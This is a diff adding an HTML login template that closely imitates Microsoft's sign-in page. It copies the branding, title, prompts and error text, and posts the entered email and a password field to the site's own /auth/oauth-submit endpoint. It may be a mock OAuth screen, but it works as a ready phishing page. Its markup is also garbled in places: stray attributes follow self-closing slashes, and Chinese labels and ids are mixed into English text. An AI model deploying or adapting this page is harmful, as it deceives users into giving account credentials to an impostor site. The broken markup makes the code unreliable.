@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in to your Microsoft account</title>
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"/>
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Cairo', 'IBM Plex Arabic', 'Tajawal', sans-serif, 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+      background: #f2f2f2;
+      background-image: radial-gradient(circle at 50% 50%, rgba(255, 255, 255, 0.8) 0%, rgba(242, 242, 242, 1) 100%);
+      color: #1b1b1b;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .ms-container {
+      width: 100%;
+      max-width: 440px;
+    }
+    .ms-card {
+      background: #ffffff;
+      padding: 44px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+      border-radius: 2px;
+      margin-bottom: 16px;
+      position: relative;
+    }
+    .ms-brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+    .ms-logo-icon {
+      width: 21px;
+      height: 21px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 2px;
+    }
+    .ms-logo-icon span:nth-child(1) { background: #f25022; }
+    .ms-logo-icon span:nth-child(2) { background: #7fba00; }
+    .ms-logo-icon span:nth-child(3) { background: #00a4ef; }
+    .ms-logo-icon span:nth-child(4) { background: #ffb900; }
+    .ms-brand-text {
+      font-size: 19px;
+      font-weight: 600;
+      color: #737373;
+      
+    }
+    .ms-title {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 16px;
+    }
+    .ms-input-group {
+      margin-bottom: 16px;
+      position: relative;
+    }
+    .ms-input {
+      width: 100%;
+      padding: 6px 0;
+      font-size: 15px;
+      color: #1b1b1b;
+      border: none;
+      border-bottom: 1px solid #666666;
+      outline: none;
+      background: transparent;
+      transition: border-color 0.2s;
+      font-family: 'Cairo', 'IBM Plex Arabic', 'Tajawal', sans-serif, inherit;
+    }
+    .ms-input:focus {
+      border-bottom: 2px solid #0067b8;
+    }
+    .ms-input::placeholder {
+      color: #666666;
+    }
+    .ms-links {
+      margin-bottom: 24px;
+      font-size: 14px;
+    }
+    .ms-link {
+      color: #0067b8;
+      text-decoration: none;
+      display: inline-block;
+      margin-bottom: 8px;
+    }
+    .ms-link:hover {
+      text-decoration: underline;
+    }
+    .ms-actions {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 24px;
+    }
+    .ms-btn-primary {
+      background: #0067b8;
+      color: #ffffff;
+      border: none;
+      padding: 6px 36px;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 0;
+      cursor: pointer;
+      font-family: 'Cairo', 'IBM Plex Arabic', 'Tajawal', sans-serif, inherit;
+      min-width: 108px;
+      min-height: 32px;
+      transition: background 0.15s;
+    }
+    .ms-btn-primary:hover {
+      background: #005da6;
+    }
+    .ms-options-card {
+      background: #ffffff;
+      padding: 12px 44px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+      border-radius: 2px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .ms-options-card:hover {
+      background: #f8f8f8;
+    }
+    .ms-key-icon {
+      width: 20px;
+      height: 20px;
+      color: #1b1b1b;
+    }
+    .ms-options-text {
+      font-size: 15px;
+      color: #1b1b1b;
+    }
+    .ms-error-alert {
+      background: #fdf2f2;
+      border: 1px solid #f8b4b4;
+      color: #9b1c1c;
+      padding: 10px 14px;
+      font-size: 14px;
+      margin-bottom: 16px;
+      border-radius: 2px;
+    }
+  </style>
+</head>
+<body>
+  <div class="ms-container">
+    <div class="ms-card">
+      <!-- Microsoft Brand Header -->
+      <div class="ms-brand">
+        <div class="ms-logo-icon">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <span class="ms-brand-text">Microsoft</span>
+      </div>
+
+      {% if error %}
+      <div class="ms-error-alert">
+        ⚠️ {{ error }}
+      </div>
+      {% endif %}
+
+      <!-- Sign In Title -->
+      <h1 class="ms-title" id="msTitle">Sign in</h1>
+
+      <form action="/auth/oauth-submit" method="POST" id="msForm">
+        <input type="hidden" name="provider" value="microsoft"/ dir="auto">
+        <input type="hidden" name="name" id="msNameInput" value="Microsoft User"/ dir="auto">
+        
+        <!-- Email Step -->
+        <div class="ms-input-group" id="emailGroup">
+          <input type="email" id="msEmail" name="email" class="ms-input" placeholder="Email, phone, or Skype" required autofocus value="{{ default_email or '' }}"/ dir="auto">
+        </div>
+
+        <!-- 密码 Step (Hidden initially) -->
+        <div class="ms-input-group" id="passwordGroup" style="display:none;">
+          <input type="password" id="ms密码" name="password" class="ms-input" placeholder="密码"/ dir="auto">
+        </div>
+
+        <!-- Microsoft Links -->
+        <div class="ms-links">
+          <div>
+            No account?
+            <a href="#" class="ms-link" onclick="enableCreateAccount(event)">Create one!</a>
+          </div>
+          <div>
+            <a href="#" class="ms-link" onclick="alert('Please enter your email to proceed.'); return false;">Can’t access your account?</a>
+          </div>
+        </div>
+
+        <!-- Next / Submit Button -->
+        <div class="ms-actions">
+          <button type="submit" class="ms-btn-primary" id="msSubmitBtn">下一步</button>
+        </div>
+      </form>
+    </div>
+
+    <!-- Sign-in Options Bar -->
+    <div class="ms-options-card" onclick="document.getElementById('msEmail').focus();">
+      <svg class="ms-key-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="7.5" cy="15.5" r="5.5"></circle>
+        <path d="M12 11l9-9"></path>
+        <path d="M17 6l3 3"></path>
+      </svg>
+      <span class="ms-options-text">Sign-in options</span>
+    </div>
+  </div>
+
+  <script>
+    function enableCreateAccount(e) {
+      if (e) e.preventDefault();
+      const emailInput = document.getElementById('msEmail');
+      const title = document.getElementById('msTitle');
+      const submitBtn = document.getElementById('msSubmitBtn');
+      const nameInput = document.getElementById('msNameInput');
+
+      title.innerText = "Create account";
+      emailInput.placeholder = "Someone@example.com";
+      submitBtn.innerText = "Next";
+      nameInput.value = "New Microsoft User";
+      emailInput.focus();
+    }
+
+    document.getElementById('msForm').addEventListener('submit', function(e) {
+      const email = (document.getElementById('msEmail').value || '').toLowerCase().trim();
+      const msDomains = ['@outlook.', '@hotmail.', '@live.', '@msn.', '@office365.', '@microsoft.', '@passport.'];
+      const isMsDomain = msDomains.some(d => email.includes(d));
+      if (!isMsDomain) {
+        e.preventDefault();
+        let errDiv = document.getElementById('clientMsError');
+        if (!errDiv) {
+          errDiv = document.createElement('div');
+          errDiv.id = 'clientMsError';
+          errDiv.className = 'ms-error-alert';
+          document.querySelector('.ms-brand').insertAdjacentElement('afterend', errDiv);
+        }
+        errDiv.innerHTML = "⚠️ That Microsoft account doesn’t exist. Enter a Microsoft account (e.g. name@outlook.com or name@hotmail.com). For Gmail accounts, please sign in with Google.";
+        return false;
+      }
+    });
+  </script>
+</body>
+</html>
